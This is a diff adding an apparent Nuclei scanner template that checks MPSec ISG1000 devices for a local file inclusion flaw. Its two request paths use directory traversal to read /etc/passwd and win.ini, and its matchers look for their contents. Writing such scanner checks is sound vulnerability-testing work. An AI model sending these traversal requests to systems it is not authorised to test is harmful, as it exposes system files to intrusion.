@@ -1,0 +1,35 @@
+http:
+- matchers:
+  - condition: or
+    part: body
+    regex:
+    - for 16-bit app support
+    - 'root:.*:0:0:'
+    type: regex
+  - status:
+    - 200
+    type: status
+  - part: header
+    type: word
+    words:
+    - text/plain
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/webui/?g=sys_dia_data_down&file_name=../../../../../../../../../../../../etc/passwd'
+  - '{{BaseURL}}/webui/?g=sys_dia_data_down&file_name=../../../../../../../../../../../../c:/windows/win.ini'
+id: mpsec-lfi
+info:
+  author: pikpikcu
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-22
+  description: MPSec ISG1000 is vulnerable to local file inclusion.
+  metadata:
+    max-request: 2
+  name: MPSec ISG1000 - Local File Inclusion
+  reference:
+  - https://twitter.com/sec715/status/1402884871173795842
+  severity: high
+  tags: mpsec,lfi
